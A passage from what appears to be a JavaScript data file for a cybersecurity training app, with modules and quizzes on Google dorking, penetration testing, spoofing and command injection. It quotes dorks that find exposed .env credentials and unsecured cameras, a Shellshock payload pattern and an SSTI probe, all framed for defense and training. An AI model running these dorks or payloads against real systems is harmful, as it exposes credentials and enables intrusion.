            { question: 'Shellshock (CVE-2014-6271) allowed command injection through which mechanism?', options: ['URL parameters', 'Environment variables processed by Bash — specifically, function definitions followed by arbitrary commands in env vars', 'SQL queries', 'Cookie values'], correct: 1, explanation: 'Shellshock exploited Bash\'s handling of function definitions in environment variables. An env var like `() { :; }; malicious_command` would execute the command after the function definition when Bash processed it.' },
            { question: 'Why is `subprocess.run(["ping", "-c", "4", hostname])` safer than `os.system("ping -c 4 " + hostname)`?', options: ['subprocess is faster', 'The array form passes each argument separately to the kernel — the hostname is never interpreted by a shell, so metacharacters have no special meaning', 'subprocess has built-in encryption', 'os.system is deprecated'], correct: 1, explanation: 'With an argument array, each element is passed directly to the execve() system call as a separate argument. There is no shell interpretation, so ; | & ` and other metacharacters are treated as literal characters in the hostname string.' },
            { question: 'What is Server-Side Template Injection (SSTI)?', options: ['Injecting templates into a browser', 'Injecting template engine syntax (e.g., {{7*7}}) into server-side templates, which the engine evaluates and executes — potentially leading to remote code execution', 'A type of CSS injection', 'Injecting HTML templates into emails'], correct: 1, explanation: 'SSTI occurs when user input is embedded directly into server-side templates (Jinja2, Twig, Freemarker). The template engine evaluates expressions like {{7*7}} → 49, and attackers can escalate to reading files, executing commands, and full RCE.' }
        ]
    },

    // =================================================================
    // 23. GOOGLE HACKING / DORKING
    // =================================================================
    GOOGLE_HACKING: {
        code: 'GOOGLE_HACKING',
        title: 'Google Hacking / Dorking',
        icon: '\u{1F50E}',
        severity: 'medium',
        color: '#a855f7',
        description: 'Using advanced search engine operators to discover exposed files, vulnerable servers, login portals, cameras, databases, and sensitive information indexed by search engines.',
        overview: {
            what: 'Google Hacking (also called Google Dorking) is the technique of using advanced search engine operators to find information that was unintentionally exposed on the internet. By combining operators like site:, filetype:, intitle:, inurl:, and intext:, attackers (and security professionals) can discover login portals, configuration files, database dumps, exposed cameras, directory listings, and vulnerable servers — all indexed by Google\'s crawler. The Google Hacking Database (GHDB) catalogs thousands of these "dorks" for security research and penetration testing.',
            keyPoints: [
                'Key operators: site: (limit to domain), filetype: (specific file types), intitle: (page title), inurl: (URL path), intext: (body content)',
                'GHDB (Google Hacking Database) maintained by Exploit-DB catalogs 6,000+ proven search queries',
                'Finds: exposed admin panels, directory listings, config files (.env, wp-config.php), database backups, webcams',
                'Not illegal to search — but accessing discovered systems without authorization is illegal',
                'Part of the OSINT (Open Source Intelligence) reconnaissance phase in penetration testing'
            ],
            examples: [
                { name: 'Exposed Environment Files', detail: 'The dork `filetype:env "DB_PASSWORD"` consistently reveals .env files containing database credentials, API keys, and secret keys on misconfigured web servers — thousands are indexed at any given time.' },
                { name: 'Unsecured IP Cameras', detail: 'Dorks like `intitle:"Live View / – AXIS"` and `inurl:"/view.shtml"` reveal thousands of publicly accessible security cameras, baby monitors, and industrial cameras with default or no authentication.' },
                { name: 'Jenkins/GitLab Exposed Dashboards', detail: 'Dorks like `intitle:"Dashboard [Jenkins]"` or `inurl:"/admin/login" site:.gov` reveal exposed CI/CD pipelines and admin panels on government and corporate servers.' }
            ],
            stats: [
                { label: 'GHDB entries', value: '6,800+', note: 'Documented dorks in the Google Hacking Database (Exploit-DB)' },
                { label: 'Exposed .env files', value: '1,000s', note: 'New database credentials indexed weekly' },
                { label: 'Recon phase usage', value: '~100%', note: 'of pen testers use Google dorking in reconnaissance' }
            ]
        },
        attackFlow: {
            title: 'Google Hacking Reconnaissance Flow',
            steps: [
                { phase: 'Target Scoping', description: 'Attacker defines the target: a specific organization (site:target.com), industry sector, or technology stack. Initial broad searches map the target\'s web presence and subdomains.', icon: '\u{1F3AF}' },
                { phase: 'Operator Crafting', description: 'Combines advanced operators to narrow results: `site:target.com filetype:sql "password"` finds SQL dumps, `site:target.com inurl:admin` finds admin panels, `site:target.com ext:log` finds log files.', icon: '\u{270F}' },
                { phase: 'GHDB Mining', description: 'Searches the Google Hacking Database (GHDB) for proven dorks relevant to the target\'s technology stack: WordPress, Apache, Nginx, Jenkins, Docker, AWS S3, etc.', icon: '\u{1F4DA}' },
                { phase: 'Results Analysis', description: 'Reviews discovered pages: directory listings for file enumeration, exposed configs for credentials, admin panels for brute-force targets, error pages for technology fingerprinting.', icon: '\u{1F4CB}' },
                { phase: 'Information Harvesting', description: 'Collects credentials from .env files, database connection strings from configs, employee names from documents, internal IP ranges from error messages, and technology stack details from headers.', icon: '\u{1F4E5}' },
                { phase: 'Attack Preparation', description: 'Harvested intelligence feeds into the next attack phases: credential stuffing with found passwords, targeting discovered admin panels, exploiting identified software versions, and social engineering with employee data.', icon: '\u{1F5FA}' }
            ]
        },
        defense: {
            detection: [
                'Google Search Console alerts for unexpected pages being indexed',
                'Monitor GHDB for new dorks targeting your technology stack',
                'Regular automated dorking against your own domains (self-assessment)',
                'Web server access logs showing Googlebot indexing sensitive directories',
                'Alerts on robots.txt changes or .htaccess modifications'
            ],
            prevention: [
                'robots.txt: Disallow sensitive directories from crawler indexing (defense-in-depth, not security boundary)',
                'X-Robots-Tag: noindex headers on sensitive pages and admin portals',
                'Authentication required for ALL admin panels, dashboards, and management interfaces',
                'Remove sensitive files from web-accessible directories (.env, .git, backups, configs)',
                'Regularly audit web root for unintended files: `site:yourdomain.com filetype:env OR filetype:sql OR filetype:log`'
            ],
            response: [
                'Immediately remove discovered exposed files and credentials from web-accessible directories',
                'Rotate ALL credentials found in exposed configuration files (database, API keys, secrets)',
                'Request Google cache removal via Search Console for sensitive indexed pages',
                'Add authentication to any discovered open admin panels or dashboards',
                'Conduct a comprehensive review: `site:yourdomain.com` to inventory all indexed pages'
            ]
        },
        indicators: {
            network: [
                'Googlebot or other search engine crawlers indexing sensitive directories or files',
                'Spike in traffic to admin pages, config files, or backup directories from unknown sources',
                'Access logs showing sequential requests to paths commonly targeted by dorks',
                'Credential stuffing attempts using credentials harvested from exposed .env or config files',
                'Requests to /.env, /.git/config, /wp-config.php.bak, /backup.sql from external IPs'
            ],
            host: [
                'Sensitive files present in web-accessible directories (.env, .git, database dumps, log files)',
                'Directory listing enabled on web servers exposing file structure',
                'Backup files with predictable names in document roots (.bak, .old, .sql, .tar.gz)',
                'Admin panels or development tools accessible without authentication',
                'Default credentials active on exposed management interfaces'
            ],
            behavioral: [
                'Unknown third parties referencing internal information that should not be public',
                'Credential compromise on services whose passwords were stored in exposed config files',
                'Reports of your organization appearing in GHDB or security researcher disclosures',
                'Unauthorized access to admin panels discovered through Google indexing',
                'Data breach originating from credentials found in publicly indexed files'
            ],
            tools: ['Google (advanced operators)', 'DorkSearch.com', 'GHDB (Exploit-DB)', 'Shodan', 'theHarvester', 'Maltego', 'Google Search Console', 'Wayback Machine (web.archive.org)']
        },
        interactive: {
            scenario: 'During a routine security assessment, you run `site:yourcompany.com filetype:env` on Google and discover that your production .env file is indexed and publicly accessible. The file contains: DATABASE_URL with full credentials, AWS_SECRET_ACCESS_KEY, STRIPE_SECRET_KEY, and SESSION_SECRET. The cached version shows it has been indexed for at least 2 weeks. What is your remediation plan?',
            options: [
                'Delete the .env file from the web server and add it to .gitignore — the problem is solved',
                'Add "Disallow: /.env" to robots.txt to prevent future indexing',
                'ASSUME ALL EXPOSED CREDENTIALS ARE COMPROMISED. Immediately: (1) remove the .env file from the web root, (2) rotate ALL exposed credentials — database password, AWS keys, Stripe keys, session secret, (3) request Google cache removal via Search Console, (4) audit AWS CloudTrail and Stripe dashboard for unauthorized activity during the 2-week exposure window, (5) add server-level blocks for dotfiles, (6) scan for similar exposures across all environments',
                'Add password protection to the .env file and leave it on the server'
            ],
            correct: 2,
            explanation: 'A 2-week exposure of production credentials means you must ASSUME compromise. Deleting the file alone is insufficient because: (1) the credentials may have already been harvested, (2) Google\'s cache still shows them, (3) the Wayback Machine may have archived them. Full remediation requires rotating EVERY exposed credential (database, AWS, Stripe, sessions), auditing cloud/payment logs for unauthorized use during the exposure window, removing Google\'s cached copy, and fixing the server configuration to block access to all dotfiles (.env, .git, .htaccess) at the web server level.'
        },
        quiz: [
            { question: 'What Google operator limits results to a specific website?', options: ['inurl:', 'site: — for example, site:example.com shows only pages indexed from that domain', 'intitle:', 'filetype:'], correct: 1, explanation: 'The site: operator restricts results to a specific domain. `site:example.com` returns only indexed pages from example.com, useful for mapping an organization\'s web footprint.' },
            { question: 'What does the Google dork `filetype:sql "INSERT INTO" "password"` search for?', options: ['SQL documentation', 'SQL dump files containing password data — likely database backups with user credentials accidentally exposed on the web', 'Secure password managers', 'SQL injection tutorials'], correct: 1, explanation: 'This dork finds SQL database dump files (filetype:sql) containing INSERT statements with password data — indicating exposed database backups that may contain plaintext or hashed credentials.' },
            { question: 'Is Google dorking illegal?', options: ['Yes, all Google dorking is illegal', 'Searching is legal; accessing discovered systems without authorization is illegal (unauthorized access violates the CFAA)', 'No, everything found through Google is legal to access', 'Only illegal in certain countries'], correct: 1, explanation: 'Using Google\'s search operators is legal — it\'s public information indexed by a search engine. However, accessing systems, downloading data, or exploiting vulnerabilities discovered through dorking without authorization violates the Computer Fraud and Abuse Act (CFAA) and similar laws.' },
            { question: 'What is the GHDB (Google Hacking Database)?', options: ['Google\'s internal hacking tools', 'A curated database of Google search queries (dorks) maintained by Exploit-DB that reveal exposed files, vulnerable servers, and sensitive information', 'A database of Google employees', 'Google\'s threat intelligence platform'], correct: 1, explanation: 'The GHDB, maintained by Exploit-DB (Offensive Security), catalogs 6,800+ proven Google dorks organized by category: files containing passwords, vulnerable servers, exposed databases, sensitive directories, and more.' },
            { question: 'Why is robots.txt NOT a security control for preventing Google dorking?', options: ['robots.txt is encrypted and attackers cannot read it', 'robots.txt is a voluntary directive that well-behaved crawlers follow, but: (1) attackers can read it to find sensitive paths, and (2) not all crawlers respect it — authentication is the real security boundary', 'robots.txt blocks all search engines permanently', 'robots.txt is only for Bing, not Google'], correct: 1, explanation: 'robots.txt is a polite suggestion, not an access control. It actually helps attackers by revealing which directories you consider sensitive (Disallow lines). Proper security requires authentication, access controls, and not placing sensitive files in web-accessible directories.' }
        ]
    },

    // =================================================================
    // 24. PENETRATION TESTING
    // =================================================================
    PEN_TESTING: {
        code: 'PEN_TESTING',
        title: 'Penetration Testing',
        icon: '\u{1F9F0}',
        severity: 'high',
        color: '#a855f7',
        description: 'An authorized simulated cyberattack methodology following five phases — reconnaissance, scanning, exploitation, post-exploitation, and reporting — to identify vulnerabilities before real attackers do.',
        overview: {
            what: 'Penetration testing (pen testing) is an authorized, methodical process of probing systems, networks, and applications for security vulnerabilities by simulating real-world attack techniques. Unlike vulnerability scanning (automated, identifies potential issues), pen testing actively exploits vulnerabilities to demonstrate real impact. It follows a structured methodology: reconnaissance (information gathering), scanning (enumeration), exploitation (gaining access), post-exploitation (maintaining access, pivoting), and reporting (findings, evidence, remediation). Pen tests require explicit written authorization (Rules of Engagement) and are conducted under legal frameworks.',
            keyPoints: [
                'Five phases: Reconnaissance → Scanning → Exploitation → Post-Exploitation → Reporting',
                'Three types: Black box (no prior knowledge), White box (full access/source code), Gray box (partial knowledge)',
                'Rules of Engagement (RoE) define scope, authorized targets, testing windows, and emergency contacts',
                'Key frameworks: PTES (Penetration Testing Execution Standard), OWASP Testing Guide, NIST SP 800-115',
                'Certifications: OSCP (Offensive Security), CEH (EC-Council), GPEN (SANS), PenTest+ (CompTIA)'
            ],
            examples: [
                { name: 'Equifax Failure (2017)', detail: 'A pen test would have discovered the unpatched Apache Struts vulnerability (CVE-2017-5638) that led to the breach of 147 million records. The vulnerability had a known exploit and patch available for 2 months before the breach.' },
                { name: 'SWIFT Banking Tests (2016+)', detail: 'After the $81 million Bangladesh Bank heist, SWIFT mandated pen testing for all member financial institutions. Tests revealed widespread vulnerabilities in banking infrastructure globally.' },
                { name: 'Tesla Bug Bounty (Ongoing)', detail: 'Tesla\'s pen testing program and bug bounty have identified hundreds of vulnerabilities including remote vehicle unlock, browser-based RCE, and autopilot manipulation — all responsibly disclosed and fixed before exploitation.' }
            ],
            stats: [
                { label: 'Successful breach rate', value: '93%', note: 'of pen tests achieve network perimeter breach (Positive Technologies)' },
                { label: 'Avg. findings per test', value: '25-50', note: 'vulnerabilities per engagement' },
                { label: 'Time to first breach', value: '< 4 hours', note: 'average in external pen tests (SANS)' }
            ]
        },
        attackFlow: {
            title: 'Penetration Testing Methodology',
            steps: [
                { phase: 'Reconnaissance (Phase 1)', description: 'Gather intelligence: OSINT (Google dorking, Shodan, social media), DNS enumeration, WHOIS, email harvesting, technology fingerprinting. Passive recon leaves no trace on the target; active recon (port scanning) does.', icon: '\u{1F50D}' },
                { phase: 'Scanning & Enumeration (Phase 2)', description: 'Active probing: Nmap port scanning, service version detection, vulnerability scanning (Nessus, OpenVAS), web application scanning (Burp Suite, Nikto), directory brute-forcing (Gobuster, ffuf).', icon: '\u{1F4E1}' },
                { phase: 'Exploitation (Phase 3)', description: 'Exploit discovered vulnerabilities: Metasploit modules, manual exploit development, credential attacks (spraying, brute force), web app exploitation (SQLi, XSS, SSRF), social engineering (if in scope). Document every step for the report.', icon: '\u{26A1}' },
                { phase: 'Post-Exploitation (Phase 4)', description: 'After gaining access: privilege escalation (linPEAS, winPEAS), lateral movement, credential harvesting (Mimikatz, Responder), persistence mechanisms, pivoting to internal networks, and data access demonstration.', icon: '\u{1F510}' },
                { phase: 'Reporting (Phase 5)', description: 'Deliver professional report: executive summary, methodology, findings ranked by severity (CVSS), evidence (screenshots, logs), exploitation steps (reproducible), and prioritized remediation recommendations.', icon: '\u{1F4DD}' },
                { phase: 'Remediation Verification', description: 'After the client patches findings, conduct a retest to verify fixes are effective. Confirm vulnerabilities are resolved and no new issues were introduced by the patches.', icon: '\u{2705}' }
            ]
        },
        defense: {
            detection: [
                'Your security controls SHOULD detect pen tests — that is part of the assessment',
                'IDS/IPS alerts during the testing window confirm detection capabilities work',
                'SOC team should be notified (or not, depending on whether it\'s a "blue team unaware" test)',
                'Network monitoring should flag reconnaissance and scanning activity',
                'Log analysis should capture exploitation attempts and lateral movement'
            ],
            prevention: [
                'Regular pen testing IS the prevention — identifies vulnerabilities before real attackers',
                'Annual pen tests minimum, quarterly for high-risk environments (PCI-DSS requires annual)',
                'Combine with vulnerability scanning, code review, and bug bounty programs for comprehensive coverage',
                'Remediate findings within defined SLAs: critical (24h), high (7 days), medium (30 days), low (90 days)',
                'Rules of Engagement must be signed before testing begins — protects both parties legally'
            ],
            response: [
                'Review pen test report findings and validate each vulnerability',
                'Prioritize remediation by risk: CVSS score x business impact x exploitability',
                'Track remediation progress with a findings management system',
                'Request a retest after remediation to verify fixes are effective',
                'Update security policies and controls based on systemic findings (not just individual bugs)'
            ]
        },
        indicators: {
            network: [
                'Port scanning patterns: sequential or targeted scans from a single source (Nmap signatures)',
                'Vulnerability scanner traffic: Nessus, OpenVAS, or Qualys plugin signatures',
                'Web application scanning: rapid sequential requests to common paths (Gobuster, Nikto, ffuf patterns)',
                'Exploitation attempts: Metasploit module signatures, known exploit payloads',
                'Credential spraying: single password attempted against many accounts in succession'
            ],
            host: [
                'Failed login attempts from the pen tester\'s authorized IP range',
                'Privilege escalation tools executed: linPEAS, winPEAS, PowerUp, Sherlock',
                'Credential dumping attempts: Mimikatz, secretsdump, hashdump in memory or on disk',
                'Unauthorized process execution or service creation during the testing window',
                'File modifications or new files in unexpected directories (web shells, backdoors as PoC)'
            ],
            behavioral: [
                'Systematic probing of systems in a methodical pattern (recon → scan → exploit)',
                'Multiple vulnerability exploitation attempts in a compressed timeframe',
                'Lateral movement from a compromised system to additional network segments',
                'Data access attempts across multiple systems to demonstrate breach impact',
                'Out-of-hours activity aligned with the pen test schedule in the Rules of Engagement'
            ],
            tools: ['Nmap', 'Burp Suite Professional', 'Metasploit Framework', 'Cobalt Strike', 'BloodHound (AD)', 'Mimikatz', 'Nessus / OpenVAS', 'OWASP ZAP', 'Gobuster / ffuf', 'Responder', 'CrackMapExec', 'Hashcat / John the Ripper']
        },
        interactive: {
            scenario: 'You are hired to conduct a penetration test for a mid-size financial company. Before starting, the client says: "Just go ahead and test everything — we trust you." They want to skip the formal scoping and Rules of Engagement (RoE) document because "it takes too long." How do you respond?',
            options: [
                'Agree and start testing immediately — they gave verbal authorization which is sufficient',
                'Refuse to begin testing until a formal Rules of Engagement document is signed. Explain that without written RoE defining scope, authorized targets, testing windows, out-of-scope systems, emergency contacts, and legal protections — both parties are at risk. Verbal authorization is not legally binding and "test everything" is dangerously ambiguous.',
                'Start testing but only on their website to limit the risk',
                'Send them a generic RoE template and start testing while they review it'
            ],
            correct: 1,
            explanation: 'NEVER begin a pen test without a signed Rules of Engagement document. "Test everything" is dangerously vague — does that include production systems, partner networks, social engineering of employees, physical access, DDoS testing? Without explicit written scope: (1) you have no legal protection if something breaks, (2) the client can claim you exceeded authorization, (3) you might affect systems outside their ownership, (4) there is no emergency contact if you cause an outage. The RoE must define: scope (in/out), methods allowed, testing windows, emergency procedures, data handling, and legal authorization signed by someone with authority to grant it.'
        },
        quiz: [
            { question: 'What are the five phases of penetration testing methodology?', options: ['Plan, Build, Test, Deploy, Monitor', 'Reconnaissance, Scanning, Exploitation, Post-Exploitation, Reporting', 'Discovery, Analysis, Remediation, Verification, Closure', 'Interview, Survey, Observe, Document, Present'], correct: 1, explanation: 'The standard pen test methodology follows: (1) Reconnaissance — gather intelligence, (2) Scanning — enumerate and probe, (3) Exploitation — gain access, (4) Post-Exploitation — escalate and pivot, (5) Reporting — document findings and recommendations.' },
            { question: 'What is the difference between black box and white box pen testing?', options: ['Black box tests web apps, white box tests networks', 'Black box: tester has no prior knowledge (simulates external attacker); White box: tester has full access to source code, architecture, and credentials (simulates insider or comprehensive audit)', 'Black box is illegal, white box is legal', 'Black box uses Linux, white box uses Windows'], correct: 1, explanation: 'Black box simulates a real attacker with zero knowledge. White box provides full transparency (source code, documentation, credentials) for maximum coverage. Gray box is the middle ground with partial knowledge.' },
            { question: 'Why are Rules of Engagement (RoE) critical before starting a pen test?', options: ['They make the test more challenging', 'They legally define the authorized scope, methods, timing, and boundaries — protecting both the tester and client from legal liability and unintended damage', 'They are optional for experienced testers', 'They are only needed for government clients'], correct: 1, explanation: 'Without signed RoE, a pen tester could face criminal charges under the CFAA for unauthorized access, and the client has no recourse if the tester causes damage. RoE define what is authorized, what is off-limits, and what happens in emergencies.' },
            { question: 'What tool is most commonly used for network port scanning during Phase 2?', options: ['Wireshark', 'Metasploit', 'Nmap — the standard for host discovery, port scanning, service detection, and OS fingerprinting', 'Burp Suite'], correct: 2, explanation: 'Nmap (Network Mapper) is the de facto standard for port scanning and network enumeration. It discovers hosts, open ports, running services, OS versions, and can run vulnerability detection scripts (NSE).' },
            { question: 'After successfully exploiting a web server during a pen test, what should you do FIRST?', options: ['Delete your traces to simulate a real attacker', 'Document the exploitation steps with screenshots and evidence for the report, then proceed to post-exploitation within the authorized scope', 'Immediately notify the client that you gained access', 'Install a permanent backdoor for future testing'], correct: 1, explanation: 'Documentation is critical — every step must be reproducible and evidenced in the final report. The client needs to understand how the exploit worked, what the impact is, and how to fix it. Then proceed to post-exploitation (privilege escalation, lateral movement) within authorized scope.' }
        ]
    },

    // =================================================================
    // 25. SPOOFING
    // =================================================================
    SPOOFING: {
        code: 'SPOOFING',
        title: 'Spoofing Attacks',
        icon: '\u{1F3AD}',
        severity: 'high',
        color: '#a855f7',
        description: 'Attacks that falsify identity by impersonating legitimate addresses, protocols, or entities — including IP spoofing, MAC spoofing, ARP spoofing, DNS spoofing, and email spoofing.',
        overview: {
            what: 'Spoofing is the act of disguising a communication or identity to appear as a trusted source. Attackers forge source addresses, protocol fields, or entity identities to bypass security controls, intercept traffic, redirect communications, or impersonate legitimate parties. Major variants include: IP spoofing (forged source IP), MAC spoofing (cloned hardware address), ARP spoofing (poisoned ARP cache for MITM), DNS spoofing/cache poisoning (redirected domain resolution), and email spoofing (forged sender headers). Each type exploits implicit trust in protocol-level identifiers.',
            keyPoints: [
                'IP Spoofing: forged source IP in packets — used for DDoS amplification, bypass IP-based ACLs, and reflection attacks',
                'ARP Spoofing: sends fake ARP replies to poison the victim\'s ARP cache, redirecting traffic through the attacker (MITM)',
                'DNS Spoofing: corrupts DNS cache or intercepts queries to redirect domain lookups to attacker-controlled IPs',
                'MAC Spoofing: changes the hardware MAC address to bypass port security, NAC, or impersonate trusted devices',
                'Email Spoofing: forged From/Reply-To headers to impersonate trusted senders (combated by SPF, DKIM, DMARC)'
            ],
            examples: [
                { name: 'Memcached DDoS Amplification (2018)', detail: 'Attackers used IP spoofing to send small requests to Memcached servers with the victim\'s spoofed source IP. The 51,000x amplification factor generated a record 1.7 Tbps DDoS attack against GitHub.' },
                { name: 'DNS Cache Poisoning — Kaminsky Attack (2008)', detail: 'Dan Kaminsky discovered a fundamental DNS vulnerability allowing cache poisoning of recursive resolvers. An attacker could redirect any domain\'s traffic to a malicious server, affecting millions of users per resolver.' },
                { name: 'BGP Hijack — Pakistan/YouTube (2008)', detail: 'Pakistan Telecom announced a false BGP route for YouTube\'s IP prefix to block it domestically, but the announcement leaked globally, redirecting worldwide YouTube traffic to Pakistan for 2 hours.' }
            ],
            stats: [
                { label: 'DDoS using IP spoofing', value: '~40%', note: 'of DDoS attacks use source IP spoofing (NETSCOUT)' },
                { label: 'Email spoofing', value: '~90%', note: 'of phishing emails use some form of sender spoofing' },
                { label: 'ARP spoofing in pen tests', value: '~70%', note: 'success rate on unsegmented LANs' }
            ]
        },
        attackFlow: {
            title: 'Spoofing Attack Methodology',
            steps: [
                { phase: 'Reconnaissance', description: 'Attacker maps the target network: identifies IP ranges, MAC addresses (ARP table), DNS servers, email infrastructure (MX records, SPF/DKIM/DMARC policies), and trust relationships between systems.', icon: '\u{1F50D}' },
                { phase: 'Identity Selection', description: 'Chooses which identity to impersonate: a trusted internal IP, the gateway\'s MAC address, an authoritative DNS server, or a legitimate email sender (executive, vendor, IT support).', icon: '\u{1F464}' },
                { phase: 'Forgery Execution', description: 'Crafts and sends spoofed packets/messages: raw socket IP packets with forged source (Scapy), gratuitous ARP replies (Ettercap, arpspoof), DNS responses with malicious records, or SMTP messages with forged headers.', icon: '\u{270F}' },
                { phase: 'Trust Exploitation', description: 'The victim\'s system accepts the spoofed communication as legitimate: firewall allows the "trusted" IP, switch forwards traffic to the spoofed MAC, resolver caches the poisoned DNS entry, user trusts the spoofed email.', icon: '\u{1F91D}' },
                { phase: 'Attack Execution', description: 'Attacker achieves the objective: MITM position (ARP/DNS spoofing), reflected DDoS (IP spoofing), credential theft (DNS to fake login page), malware delivery (email spoofing), or network access (MAC spoofing past NAC).', icon: '\u{26A1}' },
                { phase: 'Persistence & Evasion', description: 'Maintains the spoofed state: continuous ARP poisoning to stay in MITM position, TTL manipulation to keep DNS cache poisoned, or rotating spoofed source IPs to complicate DDoS mitigation.', icon: '\u{1F504}' }
            ]
        },
        defense: {
            detection: [
                'ARP monitoring tools detecting duplicate IP-to-MAC mappings (arpwatch, XArp)',
                'DNS monitoring for cache mismatches, unexpected TTL changes, or responses from unauthorized servers',
                'Email authentication failures: SPF fail, DKIM invalid, DMARC reject/quarantine logs',
                'Network IDS detecting ARP spoofing signatures, gratuitous ARP floods, or IP source anomalies',
                'Ingress/egress filtering violations: packets with source IPs that should not originate from the observed network segment'
            ],
            prevention: [
                'BCP38/BCP84 ingress filtering: routers reject packets with spoofed source IPs at the network edge',
                'Dynamic ARP Inspection (DAI) on switches: validates ARP packets against DHCP snooping bindings',
                'DNSSEC: cryptographically signs DNS records to prevent cache poisoning and response forgery',
                'Email authentication: deploy SPF + DKIM + DMARC (p=reject) to prevent email sender spoofing',
                '802.1X port-based authentication: validates device identity before granting network access (defeats MAC spoofing)'
            ],
            response: [
                'ARP spoofing detected: identify the spoofing source by port, isolate the device, flush ARP caches on affected hosts',
                'DNS spoofing detected: flush DNS caches, switch to trusted resolvers (DoH/DoT), verify DNSSEC deployment',
                'Email spoofing campaign: alert users, quarantine related messages, strengthen DMARC policy to p=reject',
                'IP spoofing for DDoS: work with upstream ISP to filter spoofed traffic, engage DDoS mitigation service',
                'Investigate the full scope — spoofing is often a means to another attack (MITM, credential theft, phishing)'
            ]
        },
        indicators: {
            network: [
                'Multiple MAC addresses associated with the same IP (ARP spoofing)',
                'Gratuitous ARP packets at high frequency from a non-gateway device',
                'DNS responses arriving from unexpected source IPs or with unusual TTL values',
                'Packets with source IPs that are impossible for the network segment (RFC 1918 from WAN, external IPs from LAN)',
                'Email headers showing SPF/DKIM/DMARC failures with Return-Path mismatches'
            ],
            host: [
                'ARP cache entries that change frequently or point to unexpected MAC addresses',
                'DNS resolution returning unexpected IP addresses for known domains',
                'SSL/TLS certificate warnings when accessing normal websites (DNS spoofing to MITM)',
                'Email client showing authentication warnings or "sent via" mismatches',
                'Network adapter operating in promiscuous mode (potential attacker system)'
            ],
            behavioral: [
                'Users reporting SSL certificate warnings on familiar websites',
                'Employees receiving emails from "executives" with unusual requests and spoofed headers',
                'Network performance degradation caused by ARP storm or MITM traffic redirection',
                'Authentication failures correlating with ARP/DNS anomalies (credentials intercepted)',
                'Unusual traffic patterns: all subnet traffic flowing through a single non-gateway host'
            ],
            tools: ['Ettercap', 'arpspoof (dsniff)', 'Bettercap', 'Scapy', 'hping3', 'Responder', 'arpwatch', 'XArp', 'dnschef', 'SPF/DKIM/DMARC analyzers (MXToolbox)', 'Wireshark']
        },
        interactive: {
            scenario: 'A user on your corporate network reports that when they visit the company intranet (intranet.company.com), their browser shows an SSL certificate warning. You investigate and find that: (1) the DNS response for intranet.company.com returns a different IP than expected, (2) arpwatch has flagged that the default gateway\'s MAC address changed 30 minutes ago, and (3) a device on the network is sending gratuitous ARP replies every 2 seconds. What is happening and what do you do?',
            options: [
                'The SSL certificate has expired — renew it and the warnings will stop',
                'An attacker is conducting ARP spoofing to position themselves as a man-in-the-middle, intercepting and modifying DNS responses to redirect intranet traffic to a credential-harvesting site. Immediately: (1) identify the spoofing device by the MAC address in the gratuitous ARPs, (2) isolate the device at the switch port, (3) flush ARP caches on all affected hosts, (4) verify DNS integrity, (5) warn all users not to bypass certificate warnings, (6) enable Dynamic ARP Inspection on switches.',
                'The network switch is malfunctioning — reboot it to clear the ARP table',
                'The user\'s browser cache is corrupted — clear the cache and retry'
            ],
            correct: 1,
            explanation: 'This is a classic ARP spoofing + DNS spoofing MITM attack chain. The attacker sends gratuitous ARP replies claiming to be the default gateway (changing the gateway\'s MAC in victims\' ARP caches). All traffic now flows through the attacker, who modifies DNS responses to redirect the intranet domain to a fake site. The SSL certificate warning is the defense working — the attacker cannot forge a valid certificate for the real domain. Remediation: locate the attacker by the spoofing MAC, shut the port, clear ARP caches, verify DNS, and deploy DAI to prevent future ARP spoofing.'
        },
        quiz: [
            { question: 'How does ARP spoofing enable a man-in-the-middle attack?', options: ['It breaks the target\'s internet connection', 'The attacker sends fake ARP replies claiming their MAC address is the gateway, causing the victim to route all traffic through the attacker', 'It encrypts traffic between two hosts', 'It changes the victim\'s IP address'], correct: 1, explanation: 'ARP spoofing poisons the victim\'s ARP cache, replacing the real gateway MAC with the attacker\'s MAC. The victim unknowingly sends all traffic to the attacker, who forwards it to the real gateway (after inspection/modification) — creating a transparent MITM position.' },
            { question: 'What three email authentication protocols work together to prevent email spoofing?', options: ['SSL, TLS, and HTTPS', 'SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), and DMARC (Domain-based Message Authentication)', 'POP3, IMAP, and SMTP', 'AES, RSA, and SHA'], correct: 1, explanation: 'SPF specifies which mail servers can send for a domain, DKIM adds a cryptographic signature to emails, and DMARC tells receivers what to do when SPF/DKIM fail (reject, quarantine). Together they make email spoofing detectable and blockable.' },
            { question: 'What is BCP38 (RFC 2827) and how does it prevent IP spoofing?', options: ['It encrypts all IP traffic', 'It requires routers to perform ingress filtering — dropping packets whose source IP addresses are not valid for the network segment they arrive from', 'It assigns unique IP addresses to every device', 'It blocks all international traffic'], correct: 1, explanation: 'BCP38 requires border routers to verify that the source IP of incoming packets matches the expected address range for that interface. If a packet claims to come from an IP not in that subnet, it is dropped — preventing spoofed source addresses from leaving the network.' },
            { question: 'How does DNSSEC prevent DNS spoofing/cache poisoning?', options: ['It encrypts DNS queries', 'It cryptographically signs DNS records so resolvers can verify that responses are authentic and unmodified', 'It blocks all DNS traffic from unknown servers', 'It requires passwords for DNS lookups'], correct: 1, explanation: 'DNSSEC adds digital signatures to DNS records using public key cryptography. Resolvers verify signatures against the chain of trust from the root zone, rejecting any response that has been modified or forged — preventing cache poisoning.' },
            { question: 'Why does an attacker need to send ARP spoofing packets continuously, not just once?', options: ['Because ARP packets are unreliable', 'Because legitimate ARP replies from the real gateway will periodically correct the victim\'s ARP cache — the attacker must continuously re-poison it to maintain the MITM position', 'Because ARP only works with continuous traffic', 'Because switches delete ARP entries after each packet'], correct: 1, explanation: 'ARP caches have timeouts and are updated by legitimate traffic. The real gateway periodically sends ARP replies that would restore the correct MAC mapping. The attacker must send poisoned ARP replies at a higher frequency to keep overwriting the legitimate entries.' }
        ]
    },

    // =================================================================
    // 26. ADVANCED SOCIAL ENGINEERING TACTICS
    // =================================================================
    SOCIAL_ENGINEERING_TACTICS: {
        code: 'SOCIAL_ENGINEERING_TACTICS',
        title: 'Advanced Social Engineering Tactics',
        icon: '\u{1F9E0}',
        severity: 'high',
        color: '#a855f7',
        description: 'Advanced tactical social engineering methods — pretexting, baiting, tailgating, quid pro quo, and watering hole attacks — with operational depth beyond basic phishing awareness.',
        overview: {
